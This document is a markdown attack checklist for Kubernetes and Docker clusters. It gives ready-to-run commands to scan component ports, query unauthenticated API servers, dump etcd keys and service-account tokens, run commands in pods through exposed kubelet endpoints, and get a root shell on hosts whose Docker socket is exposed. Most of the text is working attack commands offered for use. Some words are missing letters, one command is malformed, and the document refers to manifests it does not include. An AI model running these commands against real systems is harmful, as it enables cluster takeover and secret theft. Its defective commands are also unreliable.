###  Foreign intelligence kubernetes todo
1. Check ports for kubelet/etcd and others k8s-components
```bash
nmap -sT -p443-10250 10.0.200.18
```

- Ports of Kubernetes components sticking out 

| Port            | Process        | Description                                                   |
|-----------------|----------------|---------------------------------------------------------------|
| 443/TCP         | kube-apiserver | Kubernetes API port                                           |
| 2379-80/TCP     | etcd           |                                                               |
| 6666/TCP        | etcd           | etcd                                                          |
| 4194/TCP        | cAdvisor       | Container metrics                                             |
| 6443/TCP        | kube-apiserver | Kubernetes API port                                           |
| 8443/TCP        | kube-apiserver | Minikube API port                                             |
| 8080/TCP        | kube-apiserver | Insecure API port                                             |
| 10250/TCP       | kubelet        | HTTPS API which allows full mode access                       |
| 10255/TCP       | kubelet        | Unauth read-only HTTP port: pods, running pods and node state |
| 10249,10256/TCP | kube-proxy     | Kube Proxy health-check server                                |
| 9099/TCP        | calcio-felix   | Health check server for Calcio                                |
| 6782-4/TCP      | weave          | Metrics and endpoints                                         |
| 30000-32767/TCP | NodePort       | Proxy to the services                                         |
| 44134/TCP       | Tiler          | Helm service listening                                        |



2. Check endpoints (kube-proxy, apiserver)
- curl –k https://host:443/api{apis}/
- curl –k https://host:10250/pods
- curl -k https://host:443/version
- curl –k https://host:443/api/v1/{pods,nodes,services,namespaces...}
- curl –k https://host:443/api/v1/{namespaces}/{podname}/{logs}
- curl -k -v https://host:10249/proxyMode

3. Check kubernetes dashboard (**broken web**=**cluster access**)
- Weave Scope (4040)
- Kubernetes Dashboard (8443)
- Prometheus (9090)
- Octant (8900)

4. Attacking the API Server - API Server Information Discovery

```bash
nmap -v -n -sTC -p 443 --script +ssl-cert 10.0.200.18
```

5. Exploiting Misconfigured API Servers

```bash 
kubectl get po -n kube-system
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-system"
kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://10.0.200.18:443 get pod -n kube-system
```

6. Attacking etcd
- etcd Information Discovery
```bash curl -k https://10.0.200.18:2379/version
curl: (35) error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate
```
- Exploiting Misconfigured etcd Servers

```bash
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://10.0.200.18:2379 get / --prefix --keys-only
```

```bash 
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://10.0.200.18:2379 get /registry/secrets/kube-system/daemon-set-controller-token-[RAND]

Error: context deadline exceeded
```

- The area in the previous line that says [RAND] will be a set of five alphanumeric characters that vary per installation. This will return the service account token information. There are some  onprintable characters in the output that are a result of how the data is stored in etcd , but it is possible to extract the important value, which will start ey.... This is a JWT token that  an then be used when communicating using kubectl , for example:
```bash 
kubectl --token="[TOKEN]" -s https://10.0.200.18:6443 --insecure-skip-tls-verify get po -n kube-system
```

7. Attacking the Kubelet
- Exploiting Misconfigured Kubelets 
```bash 
curl https://[IP]:10250/run/[namespace]/[pod name]/[container name] -k -XPOST -d "cmd=[command]"
```
This will execute the command as the user running the pod; it’s the equivalent of using kubectl exec to execute a command in a running container. To make use of commands similar to the  revious, the following information can be filled in to requests to the API:  [namespace] The Kubernetes namespace of the pod [pod name] The name of the pod the container belongs to [container  ame] The name of the container to execute the command in [command] The name of the command to be run The kubelet has other available endpoints that can be used, if they have been made available  nauthenticated or an attacker has been able to get valid credentials for the kubelet. As an alternative to manual exploitation, Cyberark released a tool called kubeletctl ( github. om/cyberark/kubeletctl ) that can automate the process of using the kubelet API.

8. Attackers - External Checklist
- External attackers are typically looking for listening services. The list below is likely container related service ports and notes on testing/attacking them.

[*] 2375/TCP - Docker

This is the default insecure Docker port. It's an HTTP REST API, and usually access results in root on the host.

- Testing with Docker CLI

The easiest way to attack this is just use the docker CLI.

* `docker run -H tcp://[IP]:2375 info` - This will confirm access and return some information about the host
* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.


- **2376/TCP - Docker**

This is the default port for the Docker daemon where it requires credentials (client certificate), so you're unlikely to get far without that. If you do have the certificate and key for access :-

* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info` - format for the info command to confirm access.
* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - root on the host


- **443/TCP, 6443/TCP, 8443/TCP - Kubernetes API server**

Typical ports for the Kubernetes API server.

- Testing for access

Access to the `/version` endpoint will often work without valid credentials (using curl), as this is made available to unauthenticated users.

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] version` - Test for access with kubectl
* `curl -k https://[IP]:[PORT]/version` - Test for access with curl

- Checking permissions

It's possible that unauthenticated users have been provided more access. You can check what permissions you have with

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] auth can-i --list`

- Getting privileged access to cluster nodes

In the event that you have create pods access without authentication, see abowe k8s-manifests for useful approaches.


- **2379/TCP - etcd**

The authentication model used by etcd, when supporting a Kubernetes cluster, is relatively straightforward. It uses client certificate authentication where **any** certificate issued by it's trusted CA will provide full access to all data. In terms of attacks, there are two options unauthenticated access and authenticated acces.

- Unauthenticated Access

A good general test for this is to use curl to access the `/version` endpoint. Although most endpoints don't respond well to curl in etcdv3, this one will and it'll tell you whether unauthenticated access is possible or not.

```bash
curl [IP]:2379/version
```


If that returns version information, it's likely you can get unauthenticated access to the database. A good first step is to drop all the keys in the database, using etcdctl. First you need to set this environment variable so that etcdctl knows it's talking to a v3 server.

```bash
export ETCDCTL_API=3
```


Then this command will enumerate all the keys in  the database

```bash
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get / --prefix --keys-only
```

with a list of keys to hand the next step is generally to find useful information, for further attacks.

- **5000/TCP - Docker Registry**

Generally the goal of attacking a Docker registry is not to compromise the service itself, but to gain access to either read sensitive information stored in container images and/or modify stored container images.

- Enumerating repositories/images

Whilst you can do this with just curl, it's probably more efficient to use some of the [registry interaction tools](tools_list.md#container-registry-tooling). For example  `go-pillage-reg` will dump a list of the repositories in a a registry as well as the details of all the manifests of those images.


- **10250/TCP - kubelet**

The main kubelet port will generally be present on all worker nodes, and *may* be present on control plane nodes, if the control plane components are deployed as containers (e.g. with kubeadm). Usually authentication to this port is via client certificates and there's usually no authorization in place.

Trying the following request should either give a 401 (showing that a valid client certificate is required) or return some JSON metrics information (showing you have access to the kubelet port)

```bash
curl -k https://[IP]:10250/metrics
```

Assuming you've got access you can then execute commands in any container running on that host. As the kubelet controls the CRI (e.g. Docker) it's typically going to provide privileged access to all the containers on the host.

The easiest way to do this is to use Cyberark's [kubeletctl](https://github.com/cyberark/kubeletctl). First scan the host to show which pods can have commands executed in them

```bash
kubeletctl scan rce --server [IP]
```

Then you can use this command to execute commands in one or more of the vulnerable pods. just replace `whoami` with the command of your choice and fill in the details of the target pod, based on the information returned from the scan command

```bash
 kubeletctl run "whoami" --namespace [NAMESPACE] --pod [POD] --container [CONTAINER] --server [IP]
```

If you don't have `kubeletctl` available but do have `curl` you can use it to do the same thing. First get the pod listing

```bash
curl -k https://[IP]:10250/pods/ | jq
```

From that pull out the namespace, pod name and container name that you want to run a command in, then issue this command filling in the blanks appropriately

```bash
https://[IP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=[COMMAND]"
```

- **10255/TCP - kubelet read-only**

The kubelet read-only port is generally only seen on older clusters, but can provide some useful information disclosure if present. It's an HTTP API which will have no encryption and no authentication requirements on it, so it's easy to interact with.

The most useful endpoint will be `/pods/` so retrieving it using curl (as below) and looking at the output for useful information, is likely to be the best approach.


```bash
curl http://[IP]:10255/pods/ | jq```
